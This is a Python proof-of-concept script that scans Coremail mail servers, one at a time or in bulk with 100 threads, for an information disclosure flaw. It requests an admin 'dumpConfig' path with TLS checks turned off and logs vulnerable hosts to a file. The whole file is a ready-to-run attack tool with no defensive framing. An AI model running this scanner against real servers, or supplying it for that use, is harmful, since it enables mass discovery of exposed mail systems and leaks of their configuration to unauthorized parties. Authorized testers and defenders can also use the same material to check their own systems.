#Coremail邮件系统信息泄露

import requests,sys,argparse,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
     test="""   _____                               _ _ 
  / ____|                             (_) |
 | |     ___  _ __ ___ _ __ ___   __ _ _| |
 | |    / _ \| '__/ _ \ '_ ` _ \ / _` | | |
 | |___| (_) | | |  __/ | | | | | (_| | | |
  \_____\___/|_|  \___|_| |_| |_|\__,_|_|_|
                                author :CHKer
                                version:1.0.0
                                           

 """
     print(test)

def main():
    banner()
    parsers=argparse.ArgumentParser(description='Coremail邮件系统信息泄露')
    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
    args=parsers.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        #mp.map(poc, url_list) 的作用是并行地对 url_list 中的每个 URL 执行 poc 函数（或方法）
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    
    payload="/mailsms/s?func=ADMIN:appState&dumpConfig=/"

    headers={
        'Cache-Control':'max-age=0',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Content-Type':'application/x-www-form-urlencoded',
        'Connection':'close',
    }
    

    try:
        res1=requests.get(url=target+payload,headers=headers,verify=False)

        if res1.status_code==200 and "S_OK" in res1.text:
                    print(f"[+]目标存在 {target}")
                    with open('result24.txt','a') as f:
                        f.write(target+'\n')
        else:
             print(f'[-]目标不存在漏洞 {target}')
    except:
        pass


if __name__ == '__main__':
    main()

